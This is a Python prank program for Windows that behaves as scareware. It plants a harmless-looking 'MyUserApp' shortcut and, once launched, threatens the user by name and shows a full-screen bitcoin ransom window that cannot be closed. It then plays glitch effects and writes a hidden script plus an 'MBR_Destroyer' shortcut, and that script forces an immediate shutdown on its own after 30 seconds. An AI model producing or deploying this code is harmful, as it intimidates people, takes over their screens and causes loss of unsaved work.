import os
import sys
import tkinter as tk
from tkinter import messagebox
import getpass
import subprocess
import threading
import winsound
import time

# Global setup
username = getpass.getuser()
user_profile = os.environ['USERPROFILE']
desktop = os.path.join(user_profile, "Desktop")
if not os.path.exists(desktop):
    desktop = os.path.join(user_profile, "OneDrive", "Desktop")

# Paths for the MBR prank
mbr_script_path = os.path.join(user_profile, "mbr_logic.py") # Hidden in user folder
mbr_shortcut_path = os.path.join(desktop, "MBR_Destroyer.lnk") # Visible on Desktop

def create_shortcut(path, target, args="", icon=269):
    """Helper to create shortcuts via VBScript"""
    python_exe = sys.executable.replace("python.exe", "pythonw.exe")
    vbs = f'''
    Set oWS = WScript.CreateObject("WScript.Shell")
    Set oLink = oWS.CreateShortcut("{path}")
    oLink.TargetPath = "{python_exe}"
    oLink.Arguments = "{target} {args}"
    oLink.IconLocation = "shell32.dll, {icon}"
    oLink.Save
    '''
    vbs_path = "temp_gen.vbs"
    with open(vbs_path, "w") as f: f.write(vbs)
    subprocess.call(["cscript", "//nologo", vbs_path])
    if os.path.exists(vbs_path): os.remove(vbs_path)

# --- STAGE 5: THE FILE CREATION & AUTO-TRIGGER ---
def create_mbr_assets():
    # 1. Create the hidden logic script
    code = f"""import tkinter as tk
from tkinter import messagebox
import os
root = tk.Tk()
root.withdraw()
root.attributes("-topmost", True)
messagebox.showinfo("Warning", "This is a joke {username}, it wont destroy your mbr")
os.system("shutdown /s /t 1")
"""
    with open(mbr_script_path, "w") as f:
        f.write(code)

    # 2. Create the scary shortcut on the Desktop (Icon 131 is the 'X' / Error icon)
    create_shortcut(mbr_shortcut_path, mbr_script_path, icon=131)

def auto_trigger_logic():
    time.sleep(30)
    # If the shortcut still exists, run the logic for them
    if os.path.exists(mbr_script_path):
        subprocess.Popen([sys.executable, mbr_script_path])

# --- STAGE 4: GLITCHES ---
def start_glitches():
    def play_noise():
        for _ in range(50):
            winsound.Beep(600, 100); winsound.Beep(1200, 50)

    threading.Thread(target=play_noise, daemon=True).start()

    glitch = tk.Tk()
    glitch.attributes("-fullscreen", True, "-topmost", True)
    glitch.config(cursor="none")
    canvas = tk.Canvas(glitch, width=glitch.winfo_screenwidth(), height=glitch.winfo_screenheight(), bg='black')
    canvas.pack()

    colors = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00"]
    for i in range(0, 4000, 40):
        canvas.create_rectangle(i, 0, i+20, 3000, fill=colors[(i//40)%4], outline="")

    def finish_glitch():
        glitch.destroy()
        create_mbr_assets() # Create the shortcut and hidden script
        threading.Thread(target=auto_trigger_logic, daemon=True).start()
        messagebox.showwarning("CRITICAL ERROR", "MBR_Destroyer created. System unstable.")

    glitch.after(10000, finish_glitch)
    glitch.mainloop()

# --- STAGE 3: THE LOCKDOWN ---
def open_pay_window():
    pay_win = tk.Tk()
    pay_win.attributes("-fullscreen", True, "-topmost", True)
    pay_win.configure(bg="black", cursor="none")
    pay_win.protocol("WM_DELETE_WINDOW", lambda: None)
    pay_win.bind("<FocusOut>", lambda e: pay_win.focus_force())

    tk.Label(pay_win, text="PAY ME 1 BITCOIN AND I WILL LET YOU LEAVE", 
             fg="red", bg="black", font=("Courier", 24, "bold")).pack(pady=100)
    
    def fake_pay():
        pay_win.destroy()
        start_glitches()

    tk.Button(pay_win, text="PAY", command=fake_pay, bg="#222", fg="red", font=("Arial", 20), width=15).pack(pady=100)
    pay_win.mainloop()

# --- STAGE 1 & 2: THE STARTUP ---
def start_sequence():
    root = tk.Tk()
    root.title("MyUserApp")
    root.geometry("500x300")
    root.attributes("-topmost", True)
    
    lbl = tk.Label(root, text=f"Hello, {username}!", font=("Arial", 18))
    lbl.pack(expand=True)

    def threat():
        lbl.config(text=f"IM GONNA KILL YOU {username.upper()} >:D", fg="red", bg="black", font=("Arial", 20, "bold"))
        root.config(bg="black")
        root.after(3000, lambda: [root.destroy(), open_pay_window()])

    root.after(10000, threat)
    root.mainloop()

if __name__ == "__main__":
    if "--run" in sys.argv:
        start_sequence()
    else:
        # Create initial shortcut for MyUserApp
        app_shortcut = os.path.join(desktop, "MyUserApp.lnk")
        create_shortcut(app_shortcut, os.path.abspath(__file__), args="--run", icon=269)
        print(f"✅ MyUserApp Shortcut created on Pulpit!")
